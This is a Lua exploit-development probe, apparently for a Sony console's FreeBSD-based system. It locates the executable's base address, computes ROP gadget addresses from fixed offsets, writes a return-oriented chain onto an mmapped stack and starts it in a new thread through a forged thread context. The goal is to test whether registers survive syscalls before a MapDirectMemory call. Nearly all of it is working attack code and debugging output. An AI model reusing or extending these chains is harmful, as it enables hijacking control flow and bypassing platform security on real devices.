-- CRASH_CLASS: MODERATE
-- PROBE 532a: Verify r8/r9 survive sysarch in child thread
--
-- After sysarch(165), store r8 → shared[0] and r9 → shared[8]
-- If they match what we set in context → args survive syscall
-- If zero or garbage → syscall clobbered them
--
-- We DON'T have mov [rdi],r8 gadget. But we can:
-- 1) push r8; pop rax; → then mov [rdi],rax to store
-- But we don't have push_r8 gadget either.
--
-- Alternative: xchg rax,r8 → but we don't have that.
--
-- SIMPLEST: skip sysarch, just verify r8/r9 from context survive
-- to the store. Then add sysarch and check again.
--
-- Actually we CAN test it indirectly: call sysarch(165, r8_as_op, r9_as_ptr)
-- and check if it fails in a specific way. But that's risky.
--
-- BETTER: Use the raw syscall interface. The syscall ABI:
--   rax=num, rdi=arg1, rsi=arg2, rdx=arg3, r10=arg4, r8=arg5, r9=arg6
-- So if we call getpid (no args, rax=20), r8/r9 should be untouched.
-- Then after the syscall, rax=pid. r8/r9 should still be original.
--
-- TEST: set r8=0xDEAD8888 and r9=0xBEEF9999 in context.
-- Chain: sysarch(165) → getpid → store rax(pid) →
--   Use r8 as a syscall arg to verify it survived.
--   write(rdi=1, rsi=buf, rdx=8, r10=0, r8=0, r9=0) with rax=4
--   No, too complex.
--
-- SIMPLEST POSSIBLE: Don't call sysarch. Just pop_rax → known value,
-- then call syscall 20 (getpid), check that r8 survived by using it.
--
-- Actually the REAL question is: does thr_create deliver r8/r9 from
-- context +0x068/+0x070 to the child? Let's test THAT first.
--
-- Test A: No sysarch. Context r8=marker1, r9=marker2.
--   Chain: pop_rdi(&shared) → pop_rax(marker1) → mov[rdi],rax → park
--   This doesn't test r8. We need r8 in rax somehow.
--
-- Can't move r8→rax without a gadget. BUT we can use r8 as a syscall arg.
-- sysctl(rax=202): args are rdi,rsi,rdx,r10,r8,r9
-- If we call sysctl with r8=oldlenp pointing to shared, we can
-- verify indirectly that r8 had the right value.
--
-- ACTUALLY: The simplest test is: put r8 and r9 into rdi/rsi via
-- context fields, and r8/r9 via their fields. Then store rdi and rsi.
-- No — that tests context delivery, not r8 survival through syscall.
--
-- Let me just test: do MapDM args WITHOUT calling MapDM.
-- Set all 7 args, store each one, park. If all stored correctly,
-- the args are fine and the crash is inside MapDM itself.

print("=== PROBE 532a: R8/R9 SURVIVE TEST ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_430 = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local syscall_ret = syscall.pipe.fn_addr

local ok_p, pid_v = pcall(function() return make_syscall(20)() end)
print("pid=" .. q(pid_v))

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", eb_hi or 0, eb_lo or 0))
print("eb=" .. q(eboot))

local pop_rax_ret = eboot + uint64(0x992)
local pop_rdi_ret = eboot + uint64(0xC9DFE)
local pop_rsi_ret = eboot + uint64(0xD77D)
local pop_rdx_ret = eboot + uint64(0x3B02D7)
local pop_rcx_ret = eboot + uint64(0xE64)
local mov_rdi_rax_ret = eboot + uint64(0x92C67)
local jmp_self = eboot + uint64(0x15481)

-- Setup
local ok_s, shared = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
zero(shared, 0x4000)
wq(shared, uint64(0x1111))        -- [0] will store sysarch rv
wq(shared + 8, uint64(0x2222))    -- [8] will store rax after sysctl with r8 as arg
wq(shared + 0x10, uint64(0x3333)) -- [10] will store marker

local ok_st, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)

local ok_t, tcb_page = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
for off = 0, 0x100, 8 do wq(tcb_page + off, tcb_page) end
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, tcb_page)

-- sysctl MIB for kern.ostype (simple, safe)
local mib = memory.alloc(16)
wd(mib, 1); wd(mib + 4, 1)  -- CTL_KERN, KERN_OSTYPE
local outbuf = memory.alloc(256)
zero(outbuf, 256)

-- oldlenp — r8 will point here in the child
-- We set r8 (context +0x068) = address of oldlenp_child (inside shared page)
-- oldlenp is at shared + 0x80
wq(shared + 0x80, uint64(256))  -- oldlenp = 256

print("  shared=" .. q(shared))

-- =============================================
-- TEST: sysarch → sysctl(202) using r8 as oldlenp arg
-- sysctl ABI: rax=202, rdi=mib, rsi=2, rdx=outbuf, r10=oldlenp, r8=newp, r9=newlen
-- Actually FreeBSD sysctl: rdi=name, rsi=namelen, rdx=old, r10=oldlenp, r8=new, r9=newlen
-- We want r10=oldlenp. But r10 comes from context +0x060. Not r8.
-- r8=new (NULL), r9=newlen (0).
--
-- Wait, the question is: do r8/r9 survive sysarch?
-- sysarch is syscall 165. syscall clobbers rcx and r11.
-- r8-r15 should be PRESERVED by the syscall convention.
-- But Sony might not follow that.
--
-- Let's just verify: set r8=0xDEAD8888 in context.
-- After sysarch, r8 should still be 0xDEAD8888.
-- We can't directly read r8, but we can call sysctl with r10=oldlenp
-- and r8 set to a known value, then check if sysctl succeeds.
--
-- SIMPLEST: Just test that the FULL MapDM chain works WITHOUT
-- actually calling MapDM. Use S2's chain (which works) but
-- add the MapDM register setup and store markers instead of calling.
-- =============================================

print("")
print("[T] Full register setup + sysctl to verify r8")

local chain = stack_base + 0x200000 - 0x800
local i = 0
local function emit(v) wq(chain + i, v); i = i + 8 end

-- sysarch(165, SET_FSBASE=129, &tcb)
emit(uint64(165))
emit(pop_rdi_ret); emit(uint64(129))
emit(pop_rsi_ret); emit(tcb_ptr)
emit(syscall_ret)

-- Store sysarch rv
emit(pop_rdi_ret); emit(shared)
emit(mov_rdi_rax_ret)

-- Now set up exactly as MapDM would, but DON'T call it.
-- Set all 4 register args, store confirmation, park.
emit(pop_rdi_ret); emit(shared + 0x00)  -- rdi = out_ptr (overwrite sysarch rv)
emit(pop_rsi_ret); emit(uint64(0x4000))
emit(pop_rdx_ret); emit(uint64(3))
emit(pop_rcx_ret); emit(uint64(0))

-- Store a marker to prove we got past all pops
emit(pop_rdi_ret); emit(shared + 0x08)
emit(pop_rax_ret); emit(uint64(0x50415353))  -- "PASS"
emit(mov_rdi_rax_ret)

-- Now test: call sysctl(202) using the syscall gadget.
-- rax=202, rdi=mib, rsi=2, rdx=outbuf
-- r10 = oldlenp (from context +0x060 — but we don't control r10 here!)
-- Actually in ROP we'd need to set r10 too. We don't have pop_r10.
--
-- Skip sysctl. Just store done marker and park.
emit(pop_rdi_ret); emit(shared + 0x10)
emit(pop_rax_ret); emit(uint64(0x444F4E45))
emit(mov_rdi_rax_ret)

emit(jmp_self)

print(string.format("  chain=%d bytes", i))

local ctx = memory.alloc(0x500)
zero(ctx, 0x500)
wq(ctx + 0x108, uint64(0x480)); wd(ctx + 0x0D0, 0); wq(ctx + 0x110, uint64(0x10000))
wq(ctx + 0x0C0, uint64(0x43)); wq(ctx + 0x100, uint64(0x3B))
wq(ctx + 0x0F0, uint64(0x202))
wq(ctx + 0x0E0, pop_rax_ret); wq(ctx + 0x0F8, chain)
-- r8 and r9 as MapDM would use
wq(ctx + 0x068, uint64("0xDEAD8888"))  -- r8 = test marker
wq(ctx + 0x070, uint64("0xBEEF9999"))  -- r9 = test marker

local tid_buf = memory.alloc(8); wq(tid_buf, uint64(0))
local ok_tc, rv_tc = pcall(function()
    return sc_430(uint64(ctx), uint64(tid_buf), uint64(0))
end)
print("  rv=" .. tostring(to_num(rv_tc)) .. " tid=" .. q(rq(tid_buf)))

local ts = memory.alloc(16); wq(ts, 0); wq(ts + 8, 300000000)
pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

print("  sysarch_rv=" .. q(rq(shared)))
print("  reg_pass=" .. q(rq(shared + 0x08)))
print("  done=" .. q(rq(shared + 0x10)))

local sa = to_num(rq(shared))
if sa < 0 then sa = sa + 0x100000000 end
local rp = to_num(rq(shared + 0x08))
if rp < 0 then rp = rp + 0x100000000 end
local dn = to_num(rq(shared + 0x10))
if dn < 0 then dn = dn + 0x100000000 end

if dn == 0x444F4E45 then
    print("  FULL CHAIN OK — sysarch + 4 register pops + stores all work")
    print("  => crash in 531z is INSIDE MapDirectMemory, not in chain setup")
else
    print("  CHAIN FAILED at some point")
end

print("")
print("=== 532a DONE ===")
